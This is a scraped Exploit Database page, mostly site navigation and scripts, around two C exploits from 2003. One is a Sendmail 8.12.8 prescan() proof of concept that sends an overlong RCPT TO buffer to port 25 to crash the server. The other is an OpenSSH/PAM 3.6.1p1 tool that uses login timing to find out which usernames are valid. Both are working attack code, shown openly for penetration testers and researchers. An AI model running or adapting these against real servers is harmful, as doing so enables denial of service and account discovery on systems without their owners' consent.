BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 24
Sendmail 8.12.8 (BSD) - 'Prescan()' Remote Command Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSendmail 8.12.8 (BSD) - 'Prescan()' Remote Command ExecutionEDB-ID:24CVE:2003-0161EDB Verified:Author:bysinType:remoteExploit:/Platform:LinuxDate:2003-04-30Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** Sendmail 8.12.8 prescan() PROOF OF CONCEPT exploit by bysin** This is to prove that the bug in sendmail 8.12.8 and below is vulnerable.* On sucessful POC exploitation the program should crash with the following:** Program received signal SIGSEGV, Segmentation fault.* 0x5c5c5c5c in ?? ()**/#include <sys/types.h>#include <sys/socket.h>#include <sys/time.h>#include <netinet/in.h>#include <unistd.h>#include <netdb.h>#include <stdio.h>#include <fcntl.h>#include <errno.h>int maxarch=1;struct arch {char *os; // The OSint pos; // The position of ebp in the stack, with the last byte being 0x00int apos; // The amount of bytes after pvpbuf where ebp is locatedunsigned long addr; // The pointer to the addr buffer} archs[] = {{"FreeBSD 4.7-RELEASE",180,28,0xbfbfdad1},};/////////////////////////////////////////////////////////#define BUFSIZE 50096void header() {printf("Sendmail 8.12.8 prescan() exploit by bysin\n\n");}void printtargets() {unsigned long i;header();printf("\t  Target\t Addr\t\t OS\n");printf("\t-------------------------------------------\n");for (i=0;i<maxarch;i++) printf("\t* %d\t\t 0x%08x\t %s\n",i,archs[i].addr,archs[i].os);printf("\n");}void printresponse(char *a) {printf("%s\n",a);}void writesocket(int sock, char *buf) {if (send(sock,buf,strlen(buf),0) <= 0) {printf("Error writing to socket\n");exit(0);}printresponse(buf);}void readsocket(int sock, int response) {char temp[BUFSIZE];memset(temp,0,sizeof(temp));if (recv(sock,temp,sizeof(temp),0) <= 0) {printf("Error reading from socket\n");exit(0);}if (response != atol(temp)) {printf("Bad response: %s\n",temp);exit(0);}else printresponse(temp);}void relay(int sock) {while(1) {char temp[BUFSIZE];memset(temp,0,sizeof(temp));if (recv(sock,temp,sizeof(temp),0) <= 0) {printf("Server vulnerable (crashed)\n");exit(0);}printresponse(temp);if (atol(temp) == 553) {printf("Not exploitable\n");exit(0);}}}int main(int argc, char **argv) {struct sockaddr_in server;unsigned long ipaddr,i,j,m;int sock,target;char tmp[BUFSIZE],buf[BUFSIZE],*p,*pos=NULL;if (argc <= 2) {printf("%s <target ip> <target number>\n",argv[0]);printtargets();return 0;}target=atol(argv[2]);if (target < 0 || target >= maxarch) {printtargets();return 0;}header();if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {printf("Unable to create socket\n");exit(0);}server.sin_family = AF_INET;server.sin_port = htons(25);printf("Resolving address... ");fflush(stdout);if ((ipaddr = inet_addr(argv[1])) == -1) {struct hostent *hostm;if ((hostm=gethostbyname(argv[1])) == NULL) {printf("Unable to resolve address\n");exit(0);}memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);}else server.sin_addr.s_addr = ipaddr;memset(&(server.sin_zero), 0, 8);printf("Address found\n");printf("Connecting... ");fflush(stdout);if (connect(sock,(struct sockaddr *)&server, sizeof(server)) != 0) {printf("Unable to connect\n");exit(0);}printf("Connected\n");printf("Sending exploit... \n");fflush(stdout);readsocket(sock,220);writesocket(sock,"HELO yahoo.com\r\n");readsocket(sock,250);writesocket(sock,"MAIL FROM: <a@yahoo.com>\r\n");readsocket(sock,250);memset(buf,0,sizeof(buf));strcpy(buf,"RCPT TO: ");p=buf+strlen(buf);for (i=1,j=0,m=0;i<1242;i++) {if (!(i%256)) {*p++=';';j++;}else {if (j < 4) *p++='A';else {if (m == archs[target].pos) pos=p;//if (m > archs[target].pos) *p++='B'; else*p++='A';m++;}}}if (pos) memcpy(pos,(char*)&archs[target].addr,4);*p++=';';for (i=0;i<archs[target].apos;i++) {*p++='\\';*p++=0xff;}strcat(buf,"\r\n");writesocket(sock,buf);relay(sock);}// milw0rm.com [2003-04-30]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 25
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDOpenSSH/PAM 3.6.1p1 - Remote Users Discovery ToolEDB-ID:25CVE:2003-0190EDB Verified:Author:Maurizio AgazziniType:remoteExploit:/Platform:LinuxDate:2003-04-30Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** SSH_BRUTE - OpenSSH/PAM <= 3.6.1p1 remote users discovery tool* Copyright (c) 2003 @ Mediaservice.net Srl. All rights reserved*** Vulnerability discovered by Marco Ivaldi <raptor@mediaservice.net>* Proof of concept code by Maurizio Agazzini <inode@mediaservice.net>** Tested against Red Hat, Mandrake, and Debian GNU/Linux.** Reference: http://lab.mediaservice.net/advisory/2003-01-openssh.txt** $ tar xvfz openssh-3.6.1p1.tar.gz* $ patch -p0 <openssh-3.6.1p1_brute.diff* patching file openssh-3.6.1p1/ssh.c* patching file openssh-3.6.1p1/sshconnect.c* patching file openssh-3.6.1p1/sshconnect1.c* patching file openssh-3.6.1p1/sshconnect2.c* $ cd openssh-3.6.1p1* $ ./configure* $ make* $ cc ../ssh_brute.c -o ssh_brute* $ ./ssh_brute 1 list.txt 192.168.0.66*/#include <stdio.h>#include <stdlib.h>#include <sys/wait.h>/* an illegal user */#define NO_USER "not_val_user"/* path of the patched ssh */#define PATH_SSH "./ssh"/* max time range for invalid user */#define TIME_RANGE 3int main(int argc, char *argv[]){FILE * in;char buffer[2000], username[100], *host;int time_non_valid = 0, time_user = 0;int version = 1, i = 0, ret;fprintf(stderr, "\n SSH_BRUTE - OpenSSH/PAM <= 3.6.1p1 remote users discovery tool\n");fprintf(stderr, " Copyright (c) 2003 @ Mediaservice.net Srl. All rights reserved\n");if (argc < 3) {fprintf(stderr, "\n Usage: %s <protocol version> <user file> <host>\n\n", argv[0]);exit(-1);}version = atoi(argv[1]);host = argv[3];if ( ( in = fopen(argv[2], "r") ) == NULL ) {fprintf(stderr, "\n Can't open %s\n", argv[2]);exit(-1);}/* test an illegal user */printf("\n Testing an illegal user\t: ");fflush(stdout);sprintf(buffer, "%s -%d %s@%s", PATH_SSH, version, NO_USER, host);for (i = 0; i < 3; i++) {ret = system(buffer);time_non_valid += WEXITSTATUS(ret);}time_non_valid /= 3;printf("%d second(s)\n\n", time_non_valid);time_non_valid += TIME_RANGE;/* test supplied users */fscanf(in, "%s", username);while ( !feof(in) ) {printf(" Testing login %s\t", username);if (strlen(username) <= 8)printf("\t");printf(": ");fflush( stdout );sprintf(buffer, "%s -%d %s@%s", PATH_SSH, version, username, host);ret = system(buffer);time_user = WEXITSTATUS(ret);if (time_user <= time_non_valid)printf("\E[31m\E[1mILLEGAL\E[m\t[%d second(s)]\n", time_user);else {/* valid user? test it again to be sure */ret = system(buffer);time_user = WEXITSTATUS(ret);if (time_user <= time_non_valid)printf("\E[31m\E[1mILLEGAL\E[m\t[%d second(s)] [2 test]\n", time_user);elseprintf("\E[32m\E[1mUSER OK\E[m\t[%d second(s)]\n", time_user);}fscanf(in, "%s", username);}fclose(in);printf("\n");exit(0);}// milw0rm.com [2003-04-30]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && 